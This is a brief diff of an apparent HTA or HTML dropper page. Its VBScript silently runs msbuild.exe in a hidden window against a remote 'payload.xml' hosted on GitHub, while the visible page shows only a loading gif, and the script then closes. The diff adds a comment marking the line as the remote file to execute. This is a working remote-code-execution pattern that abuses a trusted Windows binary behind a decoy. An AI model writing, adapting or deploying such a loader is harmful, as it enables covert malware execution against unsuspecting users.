@@ -13,6 +13,7 @@
         
         ' Method 1: Direct MSBuild from GitHub
         Set shell = CreateObject("WScript.Shell")
+        ' Remote file to execute ///////// Edit
         shell.Run "msbuild.exe http://raw.githubusercontent.com/yourusername/repo/main/payload.xml", 0, False
         
         ' Close after execution
@@ -28,4 +29,5 @@
     <img src="https://upload.wikimedia.org/windows/loading.gif" width="50" height="50">
 </center>
 </body>
+
 </html>
